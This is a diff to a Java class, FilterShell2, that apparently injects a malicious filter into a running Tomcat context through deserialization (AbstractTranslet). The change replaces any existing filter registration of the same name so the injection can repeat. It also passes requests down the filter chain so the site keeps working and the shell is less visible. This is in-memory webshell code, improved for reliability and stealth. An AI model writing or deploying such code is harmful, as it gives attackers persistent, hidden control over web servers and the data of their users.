@@ -48,9 +48,22 @@ public class FilterShell2 extends AbstractTranslet implements Serializable, Filt
 
 
             Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)getFieldValue(context,"filterConfigs");
-            filterConfigs.put(name,filterConfig);
-            context.addFilterDef(filterDef);
-            context.addFilterMapBefore(filterMap);
+
+            if (filterConfigs.get(name) == null){
+                filterConfigs.put(name,filterConfig);
+            }else {
+                filterConfigs.remove(name);
+                filterConfigs.put(name,filterConfig);
+            }
+            if (context.findFilterDef(name) == null){
+                context.addFilterDef(filterDef);
+                context.addFilterMapBefore(filterMap);
+            }else {
+                context.removeFilterDef(filterDef);
+                context.addFilterDef(filterDef);
+                context.addFilterMapBefore(filterMap);
+            }
+
         }catch (Exception e){
             e.printStackTrace();
         }
@@ -104,5 +117,6 @@ public class FilterShell2 extends AbstractTranslet implements Serializable, Filt
         }
         writer.flush();
         writer.close();
+        filterChain.doFilter(servletRequest,servletResponse);
     }
 }
